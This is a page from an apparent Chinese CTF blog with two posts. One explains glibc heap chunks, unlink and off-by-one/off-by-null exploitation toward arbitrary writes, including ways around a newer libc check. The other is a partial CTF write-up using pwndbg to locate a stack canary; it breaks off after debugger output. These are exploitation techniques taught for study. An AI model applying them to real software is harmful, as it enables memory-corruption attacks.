<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/33/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/33/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/" class="post-title-link" itemprop="url">Ptmalloc算法：off-by-one</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-10 15:49:35" itemprop="dateCreated datePublished" datetime="2022-01-10T15:49:35+08:00">2022-01-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-11 14:22:26" itemprop="dateModified" datetime="2022-08-11T14:22:26+08:00">2022-08-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Ptmalloc算法：off-by-one"><a href="#Ptmalloc算法：off-by-one" class="headerlink" title="Ptmalloc算法：off-by-one"></a>Ptmalloc算法：off-by-one</h2><p>在堆溢出的基础上，只溢出1字节，这就是<strong>off-by-one</strong></p>
<p>想了解这个漏洞必须先了解 <strong>chunk</strong> 的结构 </p>
<hr>
<h2 id="数据结构chunk"><a href="#数据结构chunk" class="headerlink" title="数据结构chunk"></a>数据结构chunk</h2><p><strong>什么是chunk？</strong>用户申请的内存空间就被称为chunk</p>
<p>在ptmalloc算法中，用户申请的内存空间以chunk为单位进行管理，它的结构入下图：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>一共有6个部分，其中最后两个部分是 <strong>large chunk</strong> 特有的</p>
<ul>
<li>prev_size：相邻的前一个堆块大小（该字段不计入当前堆块的大小计算，free状态时：数据为前一个chunk的大小，allocate状态时：用于前一个chunk写入数据）</li>
<li>size：本堆块的长度（长度计算方式：<strong>size字段长度+用户申请的长度+对齐</strong>，最后3位标志位）</li>
<li>fd&amp;bk：双向指针，用于组成一个双向空闲链表</li>
<li>fd_nextsize：指向前一个与当前 chunk 大小不同的第一个空闲块 </li>
<li>bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块 </li>
</ul>
<p><strong>chunk有两种状态</strong>：allocate chunk 和 free chunk</p>
<p>allocate chunk：用户正在使用的chunk，fd&amp;bk处用于存放数据</p>
<p>free chunk：程序中空闲的chunk，fd&amp;bk分别为指向 “后一个free chunk”和“前一个free chunk”</p>
<p>也就是说，只有allocate chunk中会存放数据，而free chunk会以<strong>双向链表</strong>的形式存储起来</p>
<p>allocate chunk：</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641452666463-1659683450531.png" class width="1641452666463"> 
<p>free chunk：</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641452614487-1659683450532.png" class width="1641452614487"> 
<p><strong>程序该怎样分辨chunk的状态？</strong></p>
<p>在解释这一点之前，先要了解一下<strong>内存对齐</strong></p>
<p>内存对齐是为了“程序执行效率”而诞生的一种机制，它可以优化CPU识别地址的效率</p>
<p>glibc的堆内存对齐机制：</p>
<p>32位：<br>最少分配16字节堆，8字节对齐，每次增加8<br>其中4字节为头部，申请1-12堆，分配16字节堆</p>
<p>64位：<br>最少分配32字节堆，16字节对齐，每次增加16<br>其中8字节为头部，申请1-24堆，分配32字节堆</p>
<p>不管是32位（8字节对齐），还是64位（16字节对齐），chunk的大小都是 <strong>8的倍数</strong> ，也就是说，<strong>chunk -&gt; size</strong> 的最后3位恒为“0”，ptmalloc算法干脆就把这3位当成了标志位，用于描述一些chunk的信息</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641455617594-1659683450532.png" class width="1641455617594">  
<p>P位：指示相邻的前一个堆块是alloc还是free</p>
<p>M位：是否属于主进程</p>
<p>N位：是否由 mmap() 分配</p>
<h2 id="chunk分类"><a href="#chunk分类" class="headerlink" title="chunk分类"></a>chunk分类</h2><p>除了根据P位进行的分类：allocate chunk &amp; free chunk </p>
<p>还有：top chunk &amp; last remainder chunk </p>
<p>glibc提供给用户的chunk主要就分为这4类</p>
<ul>
<li>top chunk：处于一个arena的最顶部(即最高内存地址处)的chunk</li>
<li>last remainder chunk：unsorted bin中的最后一个chunk </li>
</ul>
<p>这里引入了“bin”的概念，不过我想在UAF中分析“bin”，这里就先提一下吧：</p>
<ul>
<li>small chunk：小于512（1024）字节的chunk</li>
<li>large chunk：大于512（1024）字节的chunk</li>
</ul>
<h2 id="chunk合并"><a href="#chunk合并" class="headerlink" title="chunk合并"></a>chunk合并</h2><p>先说说off-by-one的效果</p>
<p>两个相邻的chunk中（“chunk1”和“chunk2”），对“chunk1”进行操作（通常要用到UAF）使其溢出一字节到“chunk2”中，而它就会覆盖“chunk2”的presize的最后一字节</p>
<p>看上去好像没什么作用，但它的威力的确很大</p>
<p>因为在free掉“chunk2”后会发生 <strong>chunk合并</strong>，一共有两种合成方式：</p>
<p><strong>向前合并</strong>（将要被free的chunk作为素材，被后一个chunk合并）</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1639027341437-1659683450532.png" class width="1639027341437"> 
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1639027400761-1659683450532.png" class width="1639027400761"> 
<p>chunk将要被free时，通过 <strong>inuse_bit_at_offset</strong> 检测 <strong>后一个</strong> chunk是否为free，如果是的话，将要被free的chunk会把它自己size加上nextsize（后一个chunk的大小），然后让新的chunk进入 <strong>unlink流程</strong></p>
<p><strong>向后合并</strong>（将要被free的chunk作为素材，被前一个chunk合并）</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1638982092225-1659683450532.png" class width="1638982092225"> 
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1638982103542-1659683450532.png" class width="1638982103542"> 
<p>chunk将要被free时，通过 <strong>自己的sizeP位</strong> 检测 <strong>前一个</strong> chunk是否为free，如果是的话，它会把它自己的size加到前一块chunk的size中 ，然后让新的chunk进入 <strong>unlink流程</strong></p>
<p><strong>unlink</strong></p>
<p>unlink是一个宏操作，用于将某一个空闲chunk 从其所处的双向链表中脱链 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)</span></span></span><br><span class="line"><span class="function"></span>&#123;	<span class="comment">//p是某个结构体“malloc_chunk”的地址，*p就是结构体本身（进行了降阶）</span></span><br><span class="line">    FD = P-&gt;fd;		<span class="comment">//FD就是指向下一个结构体的指针</span></span><br><span class="line">    BK = P-&gt;bk;		<span class="comment">//BK就是指向上一个结构体的指针</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action,<span class="string">&quot;corrupted double-linked list&quot;</span>,P);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;	</span><br><span class="line">        FD-&gt;bk = BK;	<span class="comment">//FD-&gt;bk：下一个结构体中的last</span></span><br><span class="line">        BK-&gt;fd = FD;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>unlink执行之前会先进行一个检查：</p>
<ul>
<li>当前这个chunkP的后一个chunk的<strong>fd</strong> == chunkP 是否成立</li>
<li>当前这个chunkP的前一个chunk的<strong>bk</strong> == chunkP 是否成立</li>
</ul>
<p>简单来说，它就是检查了：</p>
<ul>
<li>chunkP的下一个chunk的上一个chunk是不是chunkP</li>
<li>chunkP的上一个chunk的下一个chunk是不是chunkP</li>
</ul>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1639014959836-1659683450532.png" class width="1639014959836">  
<p>解释unlink函数：</p>
<ul>
<li>FD-&gt;bk = BK：让P结构体的下一个结构体中的 <strong>bk</strong> 变为 <strong>P本身的bk</strong></li>
<li>BK-&gt;fd = FD：让P结构体的上一个结构体中的 <strong>fd</strong> 变为 <strong>P本身的fd</strong></li>
</ul>
<p>就相当于跳过了<strong>P</strong>这个结构体，把 <strong>FD</strong> 和 <strong>BK</strong> 连接 </p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1660198943002.png" class width="1660198943002">  
<h2 id="off-by-one的利用姿势"><a href="#off-by-one的利用姿势" class="headerlink" title="off-by-one的利用姿势"></a>off-by-one的利用姿势</h2><p>off-by-one有多种利用方式：</p>
<ul>
<li>覆盖低字节数据（如果是地址，还可以改变其指向）</li>
<li>覆盖“size的P位”为“\x00”，伪造上一个为“free chunk”（allocate chunk的“presize”是上一个allocate chunk的数据区，所以可以溢出一字节刚好到P位）</li>
</ul>
<p>常见的造成off-by-one的原因：</p>
<ul>
<li>strlen 和 strcpy 行为不一：strlen 计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 却会拷贝 ‘\x00’ ，导致了off-by-null</li>
<li><em>( </em>(&amp;list + index)  + read(0, *(&amp;list + index) , size) ) = 0：在read写入的字节后加一个“\x00”，这种操作可以中断“打印模块”（许多打印函数会被“\x00”中断），但它也溢出了一个“\x00”出去</li>
</ul>
<p>这里介绍一种特殊的利用姿势，可以实现<strong>WAA</strong>（又叫做Unlink攻击）</p>
<p>条件：可以利用UAF漏洞编辑free chunk</p>
<p>目的：溢出一字节，改变后一个chunk的presize， 导致其<strong>后向合并判断错误</strong></p>
<p>那如果我们在“chunk1”中伪造一个“chunkF”，溢出一字节改变“chunk2”的presize，然后free掉chunk2执行后向合并，就会出现很奇妙的结果</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641459067172-1659683450532.png" class width="1641459067172"> 
<p>​        // 注意：这些操作都是在free chunk中进行的，所以有“presize”</p>
<p>伪装的“chunkF”被“chunk2”当成了合并的目标，如果“chunkF”的“ fd&amp;bk ”控制的好，就可以在通过unlink检查的同时实现<strong>WAA</strong>（write anything anywhere）</p>
<p>​        //这里先简单提一提，到了分析Unlink攻击的再详细分析</p>
<h2 id="libc版本限制"><a href="#libc版本限制" class="headerlink" title="libc版本限制"></a>libc版本限制</h2><p>“libc-2.29.so”及其之后的版本加入了一个chunk检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>需要 prechunk-&gt;size == chunk-&gt;presize</li>
</ul>
<p>由于我们难以控制一个真实 chunk 的 size 字段，所以传统的 off-by-null 方法失效，但是，只需要满足被 unlink 的 chunk 和下一个 chunk 相连，所以仍然可以伪造 fake_chunk</p>
<p>最后还要绕过 unlink 的检查，如果我们没法 leak heap_base，就要通过以下的办法进行绕过：</p>
<ul>
<li>伪造的方式就是使用 large bin 遗留的 fd_nextsize 和 bk_nextsize 指针，以 fd_nextsize 为 fake_chunk 的 fd，bk_nextsize 为 fake_chunk 的 bk，这样我们可以完全控制该 fake_chunk 的 size 字段 </li>
<li>也可以使用 unsorted chunk 或者 large chunk 的 FD BK 指针，就是对堆风水的要求比较高</li>
<li>PS：伪造的方法在“Unlink攻击”中分析</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/" class="post-title-link" itemprop="url">pwndbg搜索技巧+one_gadget</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-01-06 08:23:52 / Modified: 08:49:58" itemprop="dateCreated datePublished" datetime="2022-01-06T08:23:52+08:00">2022-01-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>pwndbg搜索技巧+one_gadget</strong></p>
<p>这是某个CTF比赛上的题目</p>
<p>记得当时在打比赛时死活搞不出来“__libc_start_main”的偏移量（其实我都已经在GDB中看见了），看国外某大佬的WP后学到了不少关于“pwndbg搜索”的知识</p>
<p>通过这个题目我也纠正了不少概念上的误区，于是在此记录</p>
<hr>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000070341.png" alt="1641000070341"> </p>
<p>循环输入</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000121563.png" alt="1641000121563"> </p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000135559.png" alt="1641000135559"> </p>
<p>64位，dynamically，全开</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000226315.png" alt="1641000226315">  </p>
<p><strong>代码分析</strong></p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000431581.png" alt="1641000431581">  </p>
<p>获取数据数到“buf”中</p>
<p>sub_ACA：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000694377.png" alt="1641000694377"> </p>
<p>在s1中读入256字节（遇到“\n”就中断）</p>
<p>小循环：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641000905974.png" alt="1641000905974"> </p>
<p>如果前3个字节是”id “就把“v5”转换为整数并赋值给“v1”，否则就break</p>
<p>大循环：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001004738.png" alt="1641001004738"> </p>
<p>如果前6字节是“create”就执行函数sub_BD1，否则就break</p>
<p>sub_BD1：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001295275.png" alt="1641001295275"> </p>
<p>随机生成一段字符串</p>
<p>特大循环：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001361592.png" alt="1641001361592"> </p>
<p>如果前4字节是“quit”则break结束程序</p>
<p><strong>漏洞分析</strong></p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641003509946.png" alt="1641003509946">  </p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641001641478.png" alt="1641001641478"> </p>
<p>这里就有数组越位和栈溢出</p>
<p>没有system，没有“/bin/sh”</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641379976647.png" alt="1641379976647"> </p>
<p>“buf[v1]”并没有好好检查下标</p>
<p><strong>入侵思路</strong></p>
<p>首先考虑绕开PIE和Canary</p>
<p>那么这么泄露地址呢？</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641003528827.png" alt="1641003528827"> </p>
<p>输出函数printf可以输出“s”的值，而“s”是用随机数拼凑出来的，而且有memset填充“0”，想控制printf根本不可能</p>
<p>但是有一种邪门的方式可以泄露canary：</p>
<p><img src="/2022/01/06/pwndbg%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7+one_gadget/1641379976647-1641430195129.png" alt="1641379976647"> </p>
<p>“buf[v1]”并没有好好检查下标，也就是说，程序会把任何栈上的数据给放入“sub_BD1”进行加密，如果我们对加密后的数据进行分析，说不定就可以还原加密值</p>
<p>那么这里有两个问题需要解决：</p>
<p>1.canary相对于“buf[0]”的偏移</p>
<p>2.获取对应偏移的对应值</p>
<p>第一个问题需要在pwndbg中看： </p>
<p>在函数“sub_BD1”调用时，RAX中的值就是“buf[0]”（在ID那里输入的“0”）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0xf593</span></span><br><span class="line"> RBX  <span class="number">0x555555400e10</span> ◂— push   r15</span><br><span class="line"> RCX  <span class="number">0xffffffc0</span></span><br><span class="line"> RDX  <span class="number">0x6</span></span><br><span class="line">*RDI  <span class="number">0xf593</span></span><br><span class="line"> RSI  <span class="number">0x555555400f09</span> ◂— movsxd rsi, dword ptr [rdx + <span class="number">0x65</span>] <span class="comment">/* &#x27;create&#x27; */</span></span><br><span class="line"> R8   <span class="number">0x2</span></span><br><span class="line"> R9   <span class="number">0x2</span></span><br><span class="line"> R10  <span class="number">0x555555400f02</span> ◂— <span class="keyword">and</span>    byte ptr ds:[rax], al <span class="comment">/* &#x27;&gt; &#x27; */</span></span><br><span class="line"> R11  <span class="number">0x6</span></span><br><span class="line"> R12  <span class="number">0x5555554009c0</span> ◂— <span class="keyword">xor</span>    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7fffffffddf0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffdce0</span> —▸ <span class="number">0x7fffffffdd00</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdc60</span> ◂— <span class="number">0xd68</span> <span class="comment">/* &#x27;h\r&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x555555400d80</span> ◂— call   <span class="number">0x555555400bd1</span></span><br></pre></td></tr></table></figure>
<p>发现其值为 <strong>“0xf593”</strong> ，用pwngdb查找这个字符串：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t word <span class="number">0xf593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78381</span> <span class="number">0x81fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78385</span> <span class="number">0x5fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78389</span> <span class="number">0x9ffff59105fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78395</span> <span class="number">0x81fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f78399</span> <span class="number">0xf3fff59381fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f7839d</span> <span class="number">0xfff58ff3fff593</span></span><br><span class="line">libc<span class="number">-2.31</span>.so    <span class="number">0x7ffff7f87fe9</span> <span class="number">0xd400019d60fff593</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffdbfc</span> <span class="number">0xf593</span></span><br><span class="line">[<span class="built_in">stack</span>]         <span class="number">0x7fffffffdc76</span> <span class="number">0x86a89b009b7df593</span> </span><br></pre></td></tr></table></figure>
<p>接着找寻canary的值：</p>
